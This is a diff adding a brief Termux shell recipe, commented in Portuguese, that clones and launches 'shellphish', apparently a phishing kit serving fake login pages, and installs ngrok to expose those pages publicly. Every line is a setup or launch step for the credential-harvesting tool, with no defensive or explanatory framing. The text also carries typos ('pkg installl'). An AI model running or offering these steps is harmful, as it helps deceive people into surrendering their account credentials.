@@ -1,0 +1,37 @@
+apt update
+
+apt upgrade (Y)
+
+termux-setup-storage
+
+pkg installl git
+
+git clone https://github.com/thelinuxchoice/shellphish
+
+cd shellphish
+
+pkg installl php
+
+apt install curl
+
+git clone https://github.com/PSecurity/ps.ngrok
+
+cd ps.ngrok
+
+mv ngrok /data/data/com.termux/files/home/shellphish/
+
+cd ..
+
+rm -rf ps.ngrok
+
+chmod +x ngrok
+
+chmod +x shellphish.sh
+
+bash shellphish.sh
+
+# Ao Iniciar:
+
+cd shellphish
+
+bash shellphish.sh
